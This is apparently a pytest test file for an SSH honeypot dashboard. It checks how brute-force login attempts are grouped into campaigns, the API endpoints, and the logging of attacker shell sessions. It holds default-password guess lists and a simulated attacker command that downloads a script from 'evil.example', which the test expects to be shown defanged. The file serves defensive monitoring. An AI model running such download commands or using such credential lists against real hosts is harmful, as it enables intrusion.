import time

from app import campaigns
from app.db import Store
from tests.conftest import attempt

BOTNET_LIST = [("root", p) for p in ["123456", "admin", "toor", "1qaz", "pass1", "x9", "qwe"]]
OTHER_LIST = [("pi", p) for p in ["raspberry", "pi", "123", "raspi", "pi123"]]


def fill(store: Store, ip: str, creds, client="SSH-2.0-Go", cc="CN"):
    now = time.time()
    for u, p in creds:
        store.add_attempt(attempt(ip=ip, username=u, password=p, client=client, ts=now, country=cc))


def test_groups_machines_sharing_a_list(tmp_path):
    store = Store(tmp_path / "a.db")
    # Six machines each work through a slice of one list...
    for i in range(6):
        fill(store, f"203.0.113.{i}", BOTNET_LIST[i % 2 :], cc=["CN", "US", "BR"][i % 3])
    # ...three run a different list with different software...
    for i in range(3):
        fill(store, f"198.51.100.{i}", OTHER_LIST, client="SSH-2.0-libssh2_1.10.0")
    # ...and two lone scanners only share the universal guesses.
    fill(store, "192.0.2.1", [("root", "123456"), ("a", "b"), ("c", "d"), ("e", "f")])
    fill(store, "192.0.2.2", [("root", "123456"), ("g", "h"), ("i", "j"), ("k", "l")])

    found = campaigns.find(store)
    assert [c["ips"] for c in found] == [6, 3]
    big = found[0]
    assert big["n_countries"] == 3 and big["client"] == "SSH-2.0-Go"
    assert big["list_size"] == len(BOTNET_LIST)
    assert big["signature"][0]["ips"] == 6
    assert "_all" not in big
    assert campaigns.membership(store, "203.0.113.4")["id"] == big["id"]
    assert campaigns.membership(store, "192.0.2.1") is None


def test_same_list_different_software_is_not_merged(tmp_path):
    store = Store(tmp_path / "b.db")
    for i in range(3):
        fill(store, f"203.0.113.{i}", BOTNET_LIST, client="SSH-2.0-Go")
        fill(store, f"198.51.100.{i}", BOTNET_LIST, client="SSH-2.0-paramiko_3.4.0")
    assert sorted(c["client"] for c in campaigns.find(store)) == [
        "SSH-2.0-Go", "SSH-2.0-paramiko_3.4.0",
    ]  # fmt: skip


def test_generic_passwords_do_not_link_unrelated_tools(tmp_path):
    store = Store(tmp_path / "c.db")
    common = [("root", p) for p in ["123456", "admin", "root", "password", "1234", "qwerty"]]
    for i, client in enumerate(["SSH-2.0-Go", "SSH-2.0-libssh", "SSH-2.0-paramiko"] * 2):
        fill(store, f"192.0.2.{i}", common, client=client)
    assert campaigns.find(store) == []


def test_campaigns_api_and_ip_panel(client):
    store = client.app.state.store
    for i in range(4):
        fill(store, f"203.0.113.{i}", BOTNET_LIST)
    found = client.get("/api/campaigns").json()
    assert len(found) == 1 and found[0]["ips"] == 4
    assert client.get("/api/ip/203.0.113.2").json()["campaign"]["id"] == found[0]["id"]


def test_shell_api(client):
    rec = client.app.state.record_shell
    now = time.time()
    rec("open", {"session": "s1", "ts": now, "ip": "203.0.113.9", "username": "root",
                 "password": "123456", "client": "SSH-2.0-Go"})  # fmt: skip
    url = "http://evil.example/x.sh"
    for cmd, urls in [("uname -a", ""), (f"wget {url}", url)]:
        rec("command", {"session": "s1", "ts": now, "ip": "203.0.113.9", "command": cmd,
                        "urls": urls})  # fmt: skip
    rec("close", {"session": "s1", "ts": now + 5, "commands": 2})
    # a bot that logged in and did nothing
    rec("open", {"session": "s2", "ts": now, "ip": "203.0.113.10", "username": "root"})

    data = client.get("/api/shell").json()
    assert data["logins"] == 2 and data["active"] == 1 and data["commands"] == 2
    assert data["downloads"][0]["url"] == "hxxp[://]evil[.]example/x[.]sh"
    # Captured URLs are never shown clickable, in any view
    assert data["recent"][0]["log"] == ["uname -a", "wget hxxp[://]evil[.]example/x[.]sh"]
    assert {r["value"] for r in data["top_commands"]} == {
        "uname -a",
        "wget hxxp[://]evil[.]example/x[.]sh",
    }

    store = client.app.state.store
    store.add_attempt(attempt(ip="203.0.113.9", accepted=1, ts=now))
    detail = client.get("/api/ip/203.0.113.9").json()
    assert detail["sessions"][0]["log"][0] == "uname -a"
    assert client.get("/api/recent").json()[0]["accepted"] == 1


def test_old_database_gets_accepted_column(tmp_path):
    import sqlite3

    path = tmp_path / "old.db"
    db = sqlite3.connect(path)
    db.execute(
        "CREATE TABLE attempts (id INTEGER PRIMARY KEY, ts REAL NOT NULL, ip TEXT NOT NULL,"
        " username TEXT NOT NULL, password TEXT, method TEXT NOT NULL, client TEXT,"
        " country TEXT, country_name TEXT, city TEXT, lat REAL, lon REAL, asn INTEGER, org TEXT)"
    )
    db.execute(
        "INSERT INTO attempts (ts, ip, username, method) VALUES (1, '1.2.3.4', 'r', 'password')"
    )
    db.commit()
    db.close()
    store = Store(path)
    assert store.recent()[0]["accepted"] == 0
